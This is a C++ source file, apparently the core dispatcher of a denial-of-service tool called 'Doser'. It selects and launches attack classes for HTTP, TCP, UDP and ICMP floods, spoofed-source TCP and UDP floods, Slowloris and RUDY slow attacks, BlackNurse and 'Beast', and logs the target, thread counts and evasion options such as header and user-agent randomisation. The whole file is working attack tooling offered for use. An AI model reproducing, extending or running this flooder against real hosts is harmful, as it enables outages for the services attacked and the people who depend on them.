#include <unistd.h>
#include <array>

#include "../Headers/Doser.hpp"
#include "../Headers/Attack_Vectors.hpp"

void Doser::run() {

    show_info();

    switch (conf->vector){
        case config::NullUDP:
        case config::NullTCP:{
            Null_Flood flood{conf, logger};
            flood.run();
            break;
        }
        case config::TCPFlood:
        case config::UDPFlood:
        case config::HTTP:{
            Http_Flood flood{conf, logger};
            flood.run();
            break;
        }
        case config::SpoofedTCP:{
            Spoofed_TCP_Flood flood{conf, logger};
            flood.run();
            break;
        }
        case config::SpoofedUDP:{
            Spoofed_UDP_Flood flood{conf, logger};
            flood.run();
            break;
        }
        case config::Rudy:
        case config::Slowloris:{
            Slowloris flood{conf, logger};
            flood.run();
            break;
        }
        case config::ICMPFlood:{
            ICMP_Flood flood{conf, logger};
            flood.run();
            break;
        }
        case config::Blacknurse:{
            Black_Nurse flood{conf, logger};
            flood.run();
            break;
        }
        case config::Beast:{
            Beast flood{conf, logger};
            flood.run();
            break;
        }
        default:break;
    }
}

Doser::Doser(config *conf, Logger *logger) : conf{conf}, logger{logger} {

}

void Doser::show_info() {
    std::string message = std::string("Attacking ") + conf->website + ":" + conf->port + " with "
                          + std::to_string(conf->THREADS) + " Threads, "
                          + std::to_string(conf->CONNECTIONS) + " Connections";
    logger->Log(&message, Logger::Warning);
    message = "Delay: " + std::to_string(conf->delay) + " microsecs";
    logger->Log(&message, Logger::Warning);

    switch(conf->vector){
        case config::HTTP:
            logger->Log("Attack Vector: HTTP", Logger::Info);
            break;
        case config::NullTCP:
            logger->Log("Attack Vector: NullTCP", Logger::Info);
            break;
        case config::NullUDP:
            logger->Log("Attack Vector: NullUDP", Logger::Info);
            break;
        case config::UDPFlood:
            logger->Log("Attack Vector: UDPFlood", Logger::Info);
            break;
        case config::TCPFlood:
            logger->Log("Attack Vector: TCPFlood", Logger::Info);
            break;
        case config::Slowloris:
            logger->Log("Attack Vector: Slowloris", Logger::Info);
            break;
        case config::Rudy:
            logger->Log("Attack Vector: Rudy", Logger::Info);
            break;
        case config::ICMPFlood:
            logger->Log("Attack Vector: ICMP Flood", Logger::Info);
            break;
        case config::Blacknurse:
            logger->Log("Attack Vector: Black Nurse", Logger::Info);
            break;
        case config::SpoofedTCP:
            logger->Log("Attack Vector: Spoofed TCP", Logger::Info);
            break;
        case config::SpoofedUDP:
            logger->Log("Attack Vector: Spoofed UDP", Logger::Info);
            break;
        case config::Beast:
            logger->Log("Attack Vector: Beast", Logger::Info);
            break;
        default:break;
    }
    if(conf->UseSSL){
        logger->Log("SSL Enabled", Logger::Info);
    }
    if(conf->RandomizeHeader){
        logger->Log("Header Randomization Enabled", Logger::Info);
    }
    if(conf->RandomizeUserAgent){
        logger->Log("Useragent Randomization Enabled", Logger::Info);
    }
    logger->Log("Press <Ctrl+C> to stop\n", Logger::Info);
    usleep(1000000);
}
